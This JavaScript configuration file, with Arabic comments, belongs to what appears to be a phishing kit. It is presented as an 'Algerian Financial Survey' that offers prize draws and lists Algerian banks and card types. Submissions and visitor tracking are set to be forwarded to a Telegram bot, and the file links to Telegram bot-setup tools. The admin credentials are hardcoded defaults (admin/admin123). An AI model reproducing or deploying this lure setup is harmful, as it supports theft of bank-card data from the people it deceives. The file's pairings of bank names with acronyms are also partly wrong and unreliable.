/**
 * ملف الإعدادات العامة للمشروع
 * يمكن تعديله حسب الحاجة
 */

const CONFIG = {
    // إعدادات الموقع
    SITE: {
        NAME: "الاستبيان المالي الجزائري",
        DESCRIPTION: "مبادرة وطنية تهدف إلى تطوير الخدمات المالية والمصرفية في الجزائر",
        URL: window.location.origin,
        VERSION: "1.0.0",
        AUTHOR: "الاستبيان المالي",
        YEAR: 2024,
        LANGUAGE: "ar",
        DIRECTION: "rtl"
    },
    
    // إعدادات الاستبيان
    SURVEY: {
        VERIFICATION_CODE_LENGTH: 6,
        DEFAULT_VERIFICATION_CODE: "123456",
        MAX_SUBMISSIONS_PER_DAY: 10,
        SESSION_DURATION: 1800000, // 30 دقيقة
        AUTO_SAVE_INTERVAL: 30000 // 30 ثانية
    },
    
    // إعدادات لوحة التحكم
    ADMIN: {
        DEFAULT_USERNAME: "admin",
        DEFAULT_PASSWORD: "admin123",
        DEFAULT_SECRET_KEY: "admin123",
        SESSION_TIMEOUT: 3600000, // 1 ساعة
        LOGIN_ATTEMPTS_LIMIT: 5,
        LOCKOUT_DURATION: 900000 // 15 دقيقة
    },
    
    // إعدادات Telegram
    TELEGRAM: {
        ENABLED: true,
        MAX_RETRY_ATTEMPTS: 3,
        RETRY_DELAY: 5000, // 5 ثواني
        QUEUE_PROCESSING_INTERVAL: 30000 // 30 ثانية
    },
    
    // إعدادات التتبع
    TRACKING: {
        ENABLED: true,
        SAVE_LOCAL: true,
        SEND_TELEGRAM: true,
        DATA_RETENTION_DAYS: 30,
        AUTO_CLEANUP_INTERVAL: 86400000 // 24 ساعة
    },
    
    // إعدادات التخزين
    STORAGE: {
        MAX_SUBMISSIONS: 10000,
        MAX_VISITORS: 5000,
        MAX_LOGS: 1000,
        AUTO_BACKUP: true,
        BACKUP_INTERVAL: 604800000 // 7 أيام
    },
    
    // الرسائل النصية
    MESSAGES: {
        SUCCESS: "تم العملية بنجاح!",
        ERROR: "حدث خطأ. الرجاء المحاولة مرة أخرى.",
        LOADING: "جاري التحميل...",
        VALIDATING: "جاري التحقق...",
        SENDING: "جاري الإرسال...",
        SAVING: "جاري الحفظ..."
    },
    
    // الألوان
    COLORS: {
        PRIMARY: "#2c5aa0",
        PRIMARY_DARK: "#1a407a",
        PRIMARY_LIGHT: "#4a7bc8",
        SECONDARY: "#d4af37",
        SUCCESS: "#27ae60",
        DANGER: "#e74c3c",
        WARNING: "#f39c12",
        INFO: "#3498db",
        LIGHT: "#f8f9fa",
        DARK: "#343a40"
    },
    
    // المسارات
    PATHS: {
        CSS: "css/",
        JS: "js/",
        ASSETS: "assets/",
        DATA: "data/",
        BACKUPS: "backups/"
    },
    
    // الروابط
    LINKS: {
        TELEGRAM_BOTFATHER: "https://t.me/BotFather",
        TELEGRAM_GETIDS: "https://t.me/getidsbot",
        SUPPORT_EMAIL: "support@financial-survey.dz",
        SUPPORT_PHONE: "023456789",
        PRIVACY_POLICY: "privacy-policy.html"
    },
    
    // التواريخ
    DATES: {
        SURVEY_START: "2024-01-01",
        SURVEY_END: "2024-12-31",
        DRAW_DATE: "2025-01-15",
        RESULTS_DATE: "2025-01-20"
    },
    
    // الهدايا
    REWARDS: [
        {
            name: "سيارة جديدة",
            value: 12000000,
            quantity: 1,
            image: "car.jpg"
        },
        {
            name: "مجموعة أجهزة منزلية",
            value: 8000000,
            quantity: 1,
            image: "home-appliances.jpg"
        },
        {
            name: "حزمة أجهزة ذكية",
            value: 5000000,
            quantity: 1,
            image: "smart-devices.jpg"
        },
        {
            name: "هدايا نقدية",
            value: 500000,
            quantity: 10,
            image: "cash-prize.jpg"
        }
    ],
    
    // البنوك المدعومة
    BANKS: [
        "البنك الوطني الجزائري (BNA)",
        "بنك البركة الجزائر (BADR)",
        "البنك الجزائري (CIB)",
        "البنك الفلاحي (CPA)",
        "بنك الخليفة",
        "بنك السلام",
        "بنك أخرى"
    ],
    
    // أنواع البطاقات
    CARD_TYPES: [
        "VISA",
        "MasterCard",
        "بطاقة CIB",
        "بطاقة بلادي",
        "نوع آخر"
    ],
    
    // إعدادات الإشعارات
    NOTIFICATIONS: {
        SOUND_ENABLED: true,
        VIBRATION_ENABLED: false,
        DESKTOP_NOTIFICATIONS: true,
        BROWSER_NOTIFICATIONS: true,
        TELEGRAM_NOTIFICATIONS: true
    },
    
    // إعدادات الأداء
    PERFORMANCE: {
        LAZY_LOAD_IMAGES: true,
        DEFER_SCRIPTS: true,
        CACHE_ASSETS: true,
        MINIFY_RESOURCES: true,
        USE_CDN: false
    },
    
    // إعدادات الأمان
    SECURITY: {
        ENCRYPT_SENSITIVE_DATA: true,
        VALIDATE_INPUTS: true,
        SANITIZE_INPUTS: true,
        PREVENT_XSS: true,
        PREVENT_SQL_INJECTION: true,
        RATE_LIMITING: true,
        MAX_REQUESTS_PER_MINUTE: 60
    }
};

// تصدير الإعدادات للاستخدام العام
window.CONFIG = CONFIG;

console.log('⚙️ تم تحميل إعدادات الموقع');